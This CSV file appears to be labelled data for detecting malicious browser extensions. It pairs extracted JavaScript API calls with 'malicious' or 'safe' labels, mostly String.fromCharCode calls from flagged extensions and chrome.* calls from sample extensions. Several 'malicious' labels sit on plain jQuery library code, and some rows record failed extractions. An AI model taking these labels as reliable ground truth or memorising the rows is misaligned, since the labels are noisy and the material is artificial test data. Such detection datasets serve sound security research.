col0,col1,col2,col3,db_type,query_name,extracted_code_block
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ""},""*"")",malicious,postMessage,"window.parent.postMessage({m:""itemscoutProductAnalysisResize"",w:a,o:!e},""https://""+t)"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js,1,window.parent.postMessage,"window. ... ://""+t)",malicious,postMessage,"window.parent.postMessage({m:""productPageCrawling""},""https://""+t)"
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js,1,String.fromCharCode,String.fromCharCode argument: a[i],String. ... e(a[i]),malicious,others,String.fromCharCode(a[i])
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/crypto.js,1,String.fromCharCode,String.fromCharCode argument: o,String. ... Code(o),malicious,others,String.fromCharCode(o)
COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/sjcl.js,11,String.fromCharCode,String.fromCharCode argument: e>>>8>>>8>>>8,String. ... >8>>>8),malicious,others,String.fromCharCode(e>>>8>>>8>>>8)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,String.fromCharCode,String.fromCharCode argument: 30,String. ... ode(30),malicious,others,String.fromCharCode(30)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,String.fromCharCode,String.fromCharCode argument: 31,String. ... ode(31),malicious,others,String.fromCharCode(31)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,16,String.fromCharCode,String.fromCharCode argument: n,String. ... Code(n),malicious,others,String.fromCharCode(n)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,34,String.fromCharCode,String.fromCharCode argument: t.which,String. ... .which),malicious,others,String.fromCharCode(t.which)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,16,String.fromCharCode,String.fromCharCode argument: n,String. ... Code(n),malicious,others,String.fromCharCode(n)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentAli.899c5f46.js,34,String.fromCharCode,String.fromCharCode argument: t.which,String. ... .which),malicious,others,String.fromCharCode(t.which)
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jquery.js,2,String.fromCharCode,String.fromCharCode argument: n+65536,String. ... +65536),malicious,others,String.fromCharCode(n+65536)
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jquery.js,2,String.fromCharCode,String.fromCharCode argument: n>>10|55296,String. ... |56320),malicious,others,"String.fromCharCode(n>>10|55296,1023&n|56320)"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jqueryui.js,7,String.fromCharCode,String.fromCharCode argument: e.keyCode,String. ... eyCode),malicious,others,String.fromCharCode(e.keyCode)
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/lib/js/jqueryui.js,8,String.fromCharCode,String.fromCharCode argument: null==e ... harCode,String. ... arCode),malicious,others,String.fromCharCode(null==e.charCode?e.keyCode:e.charCode)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,2470,String.fromCharCode,String.fromCharCode argument: code,String. ... e(code),malicious,others,String.fromCharCode(code)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-vendors.81072308.js,13682,String.fromCharCode,String.fromCharCode argument: code,String. ... e(code),malicious,others,String.fromCharCode(code)
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/lib/jquery/jquery-3.4.1.js,661,String.fromCharCode,String.fromCharCode argument: high + 0x10000,String. ... 10000 ),malicious,others,String.fromCharCode( high + 0x10000 )
taint-steps/1-getAMethodCall/src/agpoehmhgoieigdbjhgphpagmloehamn.2_0_0_0/lib/jquery/jquery-3.4.1.js,663,String.fromCharCode,String.fromCharCode argument: high >> 10 | 0xD800,String. ... xDC00 ),malicious,others,"String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 )"
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: e,String. ... Code(e),malicious,others,String.fromCharCode(e)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: 32,String. ... ode(32),malicious,others,String.fromCharCode(32)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/18/18.js,2,String.fromCharCode,String.fromCharCode argument: n.which,String. ... .which),malicious,others,String.fromCharCode(n.which)
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/313/313.js,2,String.fromCharCode,String.fromCharCode argument: t+(t>25?39:97),String. ... 39:97)),malicious,others,String.fromCharCode(t+(t>25?39:97))
taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/893/893.js,1,String.fromCharCode,String.fromCharCode argument: t+(t>25?39:97),String. ... 39:97)),malicious,others,String.fromCharCode(t+(t>25?39:97))
api-samples/action/background.js,9,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'demo/index.html' })
api-samples/action/demo/index.js,76,chrome.tabs.create,chrome. ... om/' }),safe,chrome,chrome.tabs.create({ url: 'https://html5zombo.com/' })
api-samples/action/demo/index.js,248,chrome.runtime.getURL,chrome. ... jiFile),safe,chrome,chrome.runtime.getURL(emojiFile)
api-samples/action/demo/index.js,260,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/action/demo/index.js,282,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/action/demo/index.js,296,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
api-samples/alarms/background.js,16,chrome.alarms.create,chrome. ... 1\r\n  }),safe,chrome,"chrome.alarms.create('demo-default-alarm', { delayInMinutes: 1, periodInMinutes: 1 })"
api-samples/alarms/background.js,25,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/alarms/index.js,96,chrome.alarms.clear,chrome. ... \n    }),safe,chrome,"chrome.alarms.clear(name, (wasCleared) => { if (wasCleared) { this.logMessage(`Manager: canceled alarm ""${name}""`); } else { this.logMessage(`Manager: could not canceled alarm ""${name}""`); } })"
api-samples/alarms/index.js,107,chrome.alarms.create,chrome. ... rmInfo),safe,chrome,"chrome.alarms.create(name, alarmInfo)"
api-samples/alarms/index.js,128,chrome.alarms.clearAll,chrome. ... \n    }),safe,chrome,"chrome.alarms.clearAll((wasCleared) => { if (wasCleared) { this.logMessage(`Manager: canceled all alarms""`); } else { this.logMessage(`Manager: could not canceled all alarms`); } })"
api-samples/alarms/index.js,138,chrome.alarms.getAll,chrome. ... \n    }),safe,chrome,"chrome.alarms.getAll((alarms) => { for (const [index, alarm] of alarms.entries()) { const isLast = index === alarms.length - 1; this.renderAlarm(alarm, isLast); } })"
api-samples/bookmarks/popup.js,17,chrome.bookmarks.getTree,chrome. ... t);\r\n}),safe,chrome,"chrome.bookmarks.getTree((tree) => { const bookmarkList = document.getElementById('bookmarkList'); displayBookmarks(tree[0].children, bookmarkList); })"
api-samples/bookmarks/popup.js,43,chrome.bookmarks.create,chrome. ...  }\r\n  ),safe,chrome,"chrome.bookmarks.create( { title: 'Google', url: 'https://www.google.com' }, () => { console.log('Bookmark added'); location.reload(); // Refresh the popup } )"
api-samples/bookmarks/popup.js,57,chrome.bookmarks.search,chrome. ... ;\r\n  }),safe,chrome,"chrome.bookmarks.search({ url: 'https://www.google.com/' }, (results) => { for (const result of results) { if (result.url === 'https://www.google.com/') { chrome.bookmarks.remove(result.id, () => {}); } } location.reload(); })"
api-samples/bookmarks/popup.js,60,chrome.bookmarks.remove,chrome. ...  => {}),safe,chrome,"chrome.bookmarks.remove(result.id, () => {})"
api-samples/contentSettings/popup.js,34,chrome.tabs.query,chrome. ... ;\r\n  }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) { let current = tabs[0]; incognito = current.incognito; url = current.url; let types = [ 'cookies', 'images', 'javascript', 'location', 'popups', 'notifications', 'microphone', 'camera', 'automaticDownloads' ]; types.forEach(function (type) { // HACK: [type] is not recognised by the docserver's sample crawler, so // mention an explicit // type: chrome.contentSettings.cookies.get - See http://crbug.com/299634 chrome.contentSettings[type] && chrome.contentSettings[type].get( { primaryUrl: url, incognito: incognito }, function (details) { document.getElementById(type).disabled = false; document.getElementById(type).value = details.setting; } ); }); })"
api-samples/contextMenus/global_context_search/background.js,27,chrome.tabs.create,chrome. ...  + 1 }),safe,chrome,"chrome.tabs.create({ url: url.href, index: tab.index + 1 })"
api-samples/cookies/cookie-clearer/popup.js,7,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/cookies/cookie-clearer/popup.js,58,chrome.cookies.getAll,chrome. ... main }),safe,chrome,chrome.cookies.getAll({ domain })
api-samples/cookies/cookie-clearer/popup.js,92,chrome.cookies.remove,chrome. ... d\r\n  }),safe,chrome,"chrome.cookies.remove({ url: cookieUrl, name: cookie.name, storeId: cookie.storeId })"
api-samples/default_command_override/background.js,5,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ currentWindow: true })
api-samples/default_command_override/background.js,20,chrome.tabs.update,chrome. ... true }),safe,chrome,"chrome.tabs.update(tabs[newIndex].id, { active: true, highlighted: true })"
api-samples/favicon/popup.js,2,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/history/historyOverride/logic.js,6,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/history/historyOverride/logic.js,36,chrome.history.deleteUrl,chrome. ... .url }),safe,chrome,chrome.history.deleteUrl({ url: item.url })
api-samples/history/historyOverride/logic.js,57,chrome.history.search,chrome. ... o\r\n  }),safe,chrome,"chrome.history.search({ text: searchQuery, startTime: kOneWeekAgo })"
api-samples/history/historyOverride/logic.js,68,chrome.history.deleteUrl,chrome. ... alue }),safe,chrome,chrome.history.deleteUrl({ url: checkbox.value })
api-samples/history/historyOverride/logic.js,75,chrome.history.deleteAll,chrome. ... teAll(),safe,chrome,chrome.history.deleteAll()
api-samples/history/historyOverride/logic.js,79,chrome.history.search,chrome. ... 9\r\n  }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/history/showHistory/popup.js,18,chrome.tabs.create,chrome. ... f\r\n  }),safe,chrome,"chrome.tabs.create({ selected: true, url: event.srcElement.href })"
api-samples/history/showHistory/popup.js,58,chrome.history.search,chrome. ...  }\r\n  ),safe,chrome,"chrome.history.search( { text: '', // Return every history item.... startTime: oneWeekAgo // that was accessed less than one week ago. }, function (historyItems) { // For each history item, get details on all visits. for (let i = 0; i < historyItems.length; ++i) { let url = historyItems[i].url; let processVisitsWithUrl = function (url) { // We need the url of the visited item to process the visit. // Use a closure to bind the  url into the callback's args. return function (visitItems) { processVisits(url, visitItems); }; }; chrome.history.getVisits({ url: url }, processVisitsWithUrl(url)); numRequestsOutstanding++; } if (!numRequestsOutstanding) { onAllVisitsProcessed(); } } )"
api-samples/history/showHistory/popup.js,74,chrome.history.getVisits,chrome. ... l(url)),safe,chrome,"chrome.history.getVisits({ url: url }, processVisitsWithUrl(url))"
api-samples/identity/identity.js,42,chrome.identity.getProfileUserInfo,chrome. ... .ANY }),safe,chrome,chrome.identity.getProfileUserInfo()
api-samples/identity/identity.js,92,chrome.identity.getAuthToken,chrome. ... tive }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,112,chrome.identity.removeCachedAuthToken,chrome. ... oken }),safe,chrome,chrome.identity.removeCachedAuthToken({ token: current_token.token })
api-samples/identity/identity.js,183,chrome.identity.getAuthToken,chrome. ... true }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,197,chrome.identity.getAuthToken,chrome. ... alse }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/identity/identity.js,201,chrome.identity.removeCachedAuthToken,chrome. ... oken }),safe,chrome,chrome.identity.removeCachedAuthToken({ token: current_token.token })
api-samples/identity/main.js,2,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,"chrome.tabs.create({ active: true, url: 'index.html' })"
api-samples/nativeMessaging/extension/main.js,43,chrome.runtime.connectNative,chrome. ... stName),safe,chrome,chrome.runtime.connectNative(hostName)
api-samples/omnibox/new-tab-search/background.js,9,chrome.tabs.create,chrome. ... wURL }),safe,chrome,chrome.tabs.create({ url: newURL })
api-samples/omnibox/simple-example/service-worker.js,2,chrome.runtime.sendMessage,chrome. ... text }),safe,chrome,"chrome.runtime.sendMessage({ type: 'append-log', text })"
api-samples/omnibox/simple-example/service-worker.js,6,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'logs.html' })
api-samples/printing/background.js,16,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'printers.html' })
api-samples/readingList/sw.js,18,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/richNotification/popup.js,27,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/richNotification/popup.js,38,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/richNotification/popup.js,52,chrome.notifications.create,chrome. ... ptions),safe,chrome,chrome.notifications.create(options)
api-samples/sandbox/sandbox/service-worker.js,22,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'mainpage.html' })
api-samples/sandbox/sandboxed-content/service-worker.js,22,chrome.tabs.create,chrome. ... '\r\n  }),safe,chrome,chrome.tabs.create({ url: 'main.html' })
api-samples/scripting/index.js,18,chrome.scripting.getRegisteredContentScripts,chrome. ... ripts(),safe,chrome,chrome.scripting.getRegisteredContentScripts()
api-samples/scripting/index.js,30,chrome.scripting.unregisterContentScripts,chrome. ...      }),safe,chrome,chrome.scripting.unregisterContentScripts({ ids: [DYNAMIC_SCRIPT_ID] })
api-samples/scripting/index.js,38,chrome.runtime.sendMessage,chrome. ... \n    }),safe,chrome,"chrome.runtime.sendMessage({ name: 'inject-programmatic', options: { world } })"
api-samples/scripting/index.js,55,chrome.scripting.registerContentScripts,chrome. ... \n    ]),safe,chrome,"chrome.scripting.registerContentScripts([ { id: DYNAMIC_SCRIPT_ID, js: ['content-script.js'], persistAcrossSessions, matches: [matches], runAt, allFrames, world } ])"
api-samples/scripting/index.js,69,chrome.tabs.create,chrome. ... com' }),safe,chrome,chrome.tabs.create({ url: 'https://example.com' })
api-samples/scripting/index.js,78,chrome.scripting.unregisterContentScripts,chrome. ... \n    }),safe,chrome,chrome.scripting.unregisterContentScripts({ ids: [DYNAMIC_SCRIPT_ID] })
api-samples/scripting/sw.js,18,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'index.html' })
api-samples/scripting/sw.js,24,chrome.scripting.executeScript,chrome. ... s\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId }, files: ['content-script.js'], ...options })"
api-samples/scripting/sw.js,34,chrome.tabs.create,chrome. ... \n    }),safe,chrome,chrome.tabs.create({ url: 'https://example.com/#inject-programmatic' })
api-samples/storage/stylizr/popup.js,10,chrome.tabs.query,chrome. ... \n    }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/storage/stylizr/popup.js,15,chrome.scripting.insertCSS,chrome. ...      }),safe,chrome,"chrome.scripting.insertCSS({ css: items.css, target: { tabId: currentTab.id } })"
api-samples/storage/stylizr/popup.js,27,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('options.html')
api-samples/tabCapture/service-worker.js,2,chrome.tabs.query,chrome. ... )\r\n  }),safe,chrome,chrome.tabs.query({ url: chrome.runtime.getURL('receiver.html') })
api-samples/tabCapture/service-worker.js,3,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('receiver.html')
api-samples/tabCapture/service-worker.js,6,chrome.tabs.remove,chrome. ... tab.id),safe,chrome,chrome.tabs.remove(tab.id)
api-samples/tabCapture/service-worker.js,16,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('receiver.html')
api-samples/tabCapture/service-worker.js,32,chrome.tabs.sendMessage,chrome. ... d\r\n  }),safe,chrome,"chrome.tabs.sendMessage(receiverTabId, { targetTabId: currentTabId, consumerTabId: receiverTabId })"
api-samples/tabs/inspector/service-worker.js,2,chrome.tabs.create,chrome. ... )\r\n  }),safe,chrome,chrome.tabs.create({ url: chrome.runtime.getURL('window_and_tabs_manager.html') })
api-samples/tabs/inspector/service-worker.js,3,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('window_and_tabs_manager.html')
api-samples/tabs/inspector/window_and_tabs_manager.js,140,chrome.tabs.update,chrome. ... tive }),safe,chrome,"chrome.tabs.update(tabId, { active })"
api-samples/tabs/inspector/window_and_tabs_manager.js,155,chrome.tabs.update,chrome. ... ta(id)),safe,chrome,"chrome.tabs.update(id, updateTabData(id))"
api-samples/tabs/inspector/window_and_tabs_manager.js,169,chrome.tabs.move,chrome. ... ta(id)),safe,chrome,"chrome.tabs.move(id, moveTabData(id))"
api-samples/tabs/inspector/window_and_tabs_manager.js,186,chrome.tabs.create,chrome. ... e(args),safe,chrome,chrome.tabs.create(args)
api-samples/tabs/inspector/window_and_tabs_manager.js,196,chrome.tabs.update,chrome. ... ds[i])),safe,chrome,"chrome.tabs.update(tabIds[i], updateTabData(tabIds[i]))"
api-samples/tabs/inspector/window_and_tabs_manager.js,207,chrome.tabs.move,chrome. ... ds[i])),safe,chrome,"chrome.tabs.move(tabIds[i], moveTabData(tabIds[i]))"
api-samples/tabs/inspector/window_and_tabs_manager.js,215,chrome.tabs.remove,chrome. ... (tabId),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/tabs/inspector/window_and_tabs_manager.js,297,chrome.tabs.get,chrome. ... (tabId),safe,chrome,chrome.tabs.get(tabId)
api-samples/tabs/inspector/window_and_tabs_manager.js,364,chrome.tabs.query,chrome. ... owId }),safe,chrome,chrome.tabs.query({ windowId })
api-samples/tabs/inspector/window_and_tabs_manager.js,400,chrome.tabs.query,chrome. ... owId }),safe,chrome,"chrome.tabs.query({ active: true, windowId })"
api-samples/tabs/pin/service-worker.js,4,chrome.tabs.query,chrome. ... true }),safe,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
api-samples/tabs/pin/service-worker.js,7,chrome.tabs.update,chrome. ... nned }),safe,chrome,"chrome.tabs.update(current.id, { pinned: !current.pinned })"
api-samples/tabs/screenshot/service-worker.js,3,chrome.tabs.captureVisibleTab,chrome. ... leTab(),safe,chrome,chrome.tabs.captureVisibleTab()
api-samples/tabs/screenshot/service-worker.js,4,chrome.runtime.getURL,chrome. ... .html'),safe,chrome,chrome.runtime.getURL('screenshot.html')
api-samples/tabs/screenshot/service-worker.js,19,chrome.tabs.sendMessage,chrome. ... tUrl }),safe,chrome,"chrome.tabs.sendMessage(tabId, { msg: 'screenshot', data: screenshotUrl })"
api-samples/tabs/screenshot/service-worker.js,22,chrome.tabs.create,chrome. ... bUrl }),safe,chrome,chrome.tabs.create({ url: viewTabUrl })
api-samples/tabs/zoom/popup.js,30,chrome.tabs.query,chrome. ... true }),safe,chrome,chrome.tabs.query({ active: true })
api-samples/tabs/zoom/popup.js,37,chrome.tabs.getZoomSettings,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoomSettings(tabId)
api-samples/tabs/zoom/popup.js,53,chrome.tabs.getZoom,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoom(tabId)
api-samples/tabs/zoom/popup.js,76,chrome.tabs.getZoom,chrome. ... (tabId),safe,chrome,chrome.tabs.getZoom(tabId)
api-samples/tabs/zoom/popup.js,78,chrome.tabs.setZoom,chrome. ... Factor),safe,chrome,"chrome.tabs.setZoom(tabId, newZoomFactor)"
api-samples/tabs/zoom/popup.js,92,chrome.tabs.setZoom,"chrome. ... bId, 0)",safe,chrome,"chrome.tabs.setZoom(tabId, 0)"
api-samples/tabs/zoom/popup.js,117,chrome.tabs.setZoomSettings,chrome. ... eVal }),safe,chrome,"[only 0 occurrence(s) found, requested 0]"
api-samples/topSites/basic/popup.js,4,chrome.tabs.create,chrome. ... href }),safe,chrome,chrome.tabs.create({ url: event.target.href })
api-samples/topSites/magic8ball/newTab.js,16,chrome.runtime.getURL,chrome. ... icon/'),safe,chrome,chrome.runtime.getURL('/_favicon/')
api-samples/userScripts/sw.js,17,chrome.runtime.openOptionsPage,chrome. ... sPage(),safe,chrome,chrome.runtime.openOptionsPage()
api-samples/userScripts/sw.js,22,chrome.runtime.openOptionsPage,chrome. ... sPage(),safe,chrome,chrome.runtime.openOptionsPage()
api-samples/web-accessible-resources/content-script.js,12,chrome.runtime.getURL,chrome. ... }.png`),safe,chrome,chrome.runtime.getURL(`${id}.png`)
api-samples/web-accessible-resources/service-worker.js,12,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: '/index.html' })
api-samples/webNavigation/basic/service-worker.js,16,chrome.notifications.create,chrome. ... '\r\n  }),safe,chrome,"chrome.notifications.create({ type: 'basic', iconUrl: 'icon.png', title: 'page loaded', message: 'Completed loading: ' + details.url + ' at ' + details.timeStamp + ' milliseconds since the epoch.' })"
api-samples/windows/background.js,18,chrome.tabs.query,chrome. ... ery({}),safe,chrome,chrome.tabs.query({})
api-samples/windows/background.js,21,chrome.tabs.move,chrome. ...      }),safe,chrome,"chrome.tabs.move(tab.id, { windowId: current.id, index: tab.index })"
functional-samples/ai.gemini-on-device-summarization/background.js,13,chrome.tabs.get,chrome. ... (tabId),safe,chrome,chrome.tabs.get(tabId)
functional-samples/ai.gemini-on-device-summarization/background.js,17,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId }, files: ['scripts/extract-content.js'] })"
functional-samples/cookbook.geolocation-offscreen/service_worker.js,29,chrome.runtime.getURL,chrome. ... T_PATH),safe,chrome,chrome.runtime.getURL(OFFSCREEN_DOCUMENT_PATH)
functional-samples/cookbook.geolocation-offscreen/service_worker.js,58,chrome.runtime.sendMessage,chrome. ... '\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'get-geolocation', target: 'offscreen' })"
functional-samples/cookbook.offscreen-clipboard-write/background.js,37,chrome.runtime.sendMessage,chrome. ... e\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type: 'copy-data-to-clipboard', target: 'offscreen-doc', data: value })"
functional-samples/cookbook.offscreen-dom/background.js,35,chrome.runtime.sendMessage,chrome. ... a\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type, target: 'offscreen', data })"
functional-samples/cookbook.offscreen-dom/offscreen.js,52,chrome.runtime.sendMessage,chrome. ... a\r\n  }),safe,chrome,"chrome.runtime.sendMessage({ type, target: 'background', data })"
functional-samples/cookbook.sidepanel-open/content-script.js,6,chrome.runtime.sendMessage,chrome. ... nel' }),safe,chrome,chrome.runtime.sendMessage({ type: 'open_side_panel' })
functional-samples/cookbook.sidepanel-open/script.js,2,chrome.tabs.query,chrome. ... rue\r\n}),safe,chrome,"chrome.tabs.query({ active: true, lastFocusedWindow: true })"
functional-samples/cookbook.sidepanel-open/service-worker.js,21,chrome.tabs.create,chrome. ... tml' }),safe,chrome,chrome.tabs.create({ url: 'page.html' })
functional-samples/reference.mv3-content-scripts/popup.js,6,chrome.tabs.query,chrome. ... ptions),safe,chrome,chrome.tabs.query(queryOptions)
functional-samples/reference.mv3-content-scripts/popup.js,13,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, files: ['content-script.js'] })"
functional-samples/reference.mv3-content-scripts/popup.js,27,chrome.scripting.executeScript,chrome. ... ]\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, func: showAlert, args: [name] })"
functional-samples/sample.bookmarks/popup.js,15,chrome.bookmarks.getTree,chrome. ... ;\r\n  }),safe,chrome,"chrome.bookmarks.getTree(function (bookmarkTreeNodes) { $('#bookmarks').append(dumpTreeNodes(bookmarkTreeNodes, query)); })"
functional-samples/sample.bookmarks/popup.js,62,chrome.tabs.create,chrome. ... .url }),safe,chrome,chrome.tabs.create({ url: bookmarkNode.url })
functional-samples/sample.bookmarks/popup.js,102,chrome.bookmarks.remove,chrome. ... de.id)),safe,chrome,chrome.bookmarks.remove(String(bookmarkNode.id))
functional-samples/sample.bookmarks/popup.js,132,chrome.bookmarks.create,chrome. ...      }),safe,chrome,"chrome.bookmarks.create({ parentId: bookmarkNode.id, title: $('#title').val(), url: $('#url').val() })"
functional-samples/sample.bookmarks/popup.js,169,chrome.bookmarks.update,chrome. ...      }),safe,chrome,"chrome.bookmarks.update(String(bookmarkNode.id), { title: edit.val() })"
functional-samples/sample.co2meter/co2-state-iframe.js,26,chrome.runtime.connect,chrome. ... nnect(),safe,chrome,chrome.runtime.connect()
functional-samples/sample.co2meter/modules/co2_meter.js,127,chrome.runtime.sendMessage,chrome. ... ESSAGE),safe,chrome,chrome.runtime.sendMessage(PERMISSION_GRANTED_MESSAGE)
functional-samples/sample.dnr-rule-manager/manager.js,7,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,12,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,28,chrome.declarativeNetRequest.getDynamicRules,chrome. ... Rules(),safe,chrome,chrome.declarativeNetRequest.getDynamicRules()
functional-samples/sample.dnr-rule-manager/manager.js,126,chrome.declarativeNetRequest.isRegexSupported,chrome. ... \n    }),safe,chrome,"chrome.declarativeNetRequest.isRegexSupported({ isCaseSensitive: caseSensitive, regex: conditionValue })"
